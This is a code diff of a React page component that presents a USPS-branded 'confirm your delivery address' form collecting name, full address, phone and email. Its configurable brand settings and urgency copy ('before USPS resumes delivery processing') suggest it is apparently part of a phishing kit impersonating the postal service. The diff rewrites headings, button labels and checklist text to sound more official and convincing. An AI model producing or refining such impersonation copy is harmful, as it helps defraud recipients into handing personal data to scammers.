@@ -212,8 +212,8 @@ export default function Info() {
           <div className="alz-step-head">
             <div>
               <div className="alz-badge">{BRAND.name}</div>
-              <h1 className="alz-step-title">Confirm your shipping address</h1>
-              <p className="alz-step-subtitle">Review the delivery details associated with this shipment.</p>
+              <h1 className="alz-step-title">Confirm the delivery address for this shipment</h1>
+              <p className="alz-step-subtitle">Review the recipient and mailing details before USPS resumes delivery processing.</p>
             </div>
           </div>
           <div className="alz-track mt-3">
@@ -224,7 +224,7 @@ export default function Info() {
         <div className="alz-flow-grid alz-usps-flow-grid">
           <div className="alz-card alz-usps-form-card">
             <div className="alz-section-eyebrow">Delivery details</div>
-            <h2 className="alz-page-title">Review your delivery information</h2>
+            <h2 className="alz-page-title">Review your mailing information</h2>
             <p className="alz-page-copy">{status}</p>
             <div className="alz-brand-row mb-2">
               {BRAND_PROMISES.map((item) => (
@@ -285,10 +285,10 @@ export default function Info() {
               </div>
 
               <button type="submit" disabled={loading} className="alz-btn-primary mt-2 text-lg sm:text-xl md:text-2xl">
-                {loading ? 'Saving...' : 'Confirm delivery address'}
+                {loading ? 'Saving...' : 'Continue with address review'}
               </button>
               <p className="alz-helper-copy text-center mt-3">
-                USPS may ask you to confirm these details again if delivery information changes.
+                USPS may ask you to reconfirm these details if the shipment record changes.
               </p>
             </form>
 
@@ -297,20 +297,20 @@ export default function Info() {
           </div>
 
           <aside className="alz-card alz-flow-aside alz-side-summary alz-usps-side-card">
-            <div className="alz-side-summary-title">Delivery details</div>
+            <div className="alz-side-summary-title">Mailing checklist</div>
             <div className="alz-order-mini-card">
               <div className="alz-order-mini-thumb" />
               <div>
-                <div className="alz-order-mini-title">Review the delivery address on file</div>
-                <div className="alz-order-mini-copy">Confirm the recipient name, street address, ZIP Code, and contact details for this shipment.</div>
+                <div className="alz-order-mini-title">Review the address currently on file</div>
+                <div className="alz-order-mini-copy">Confirm the recipient name, street address, ZIP Code, and contact details associated with this USPS shipment.</div>
               </div>
             </div>
             <div className="alz-side-summary-list">
-              <div>Full name for delivery</div>
-              <div>Street address and ZIP Code</div>
-              <div>Phone number and email</div>
+              <div>Recipient name exactly as entered</div>
+              <div>Street address, city, state, and ZIP Code</div>
+              <div>Phone number and email for delivery updates</div>
             </div>
-            <div className="alz-side-summary-box">Use the delivery information associated with this shipment so USPS can continue processing delivery.</div>
+            <div className="alz-side-summary-box">Use the mailing information tied to this shipment so USPS can resume final delivery steps.</div>
           </aside>
         </div>
       </div>
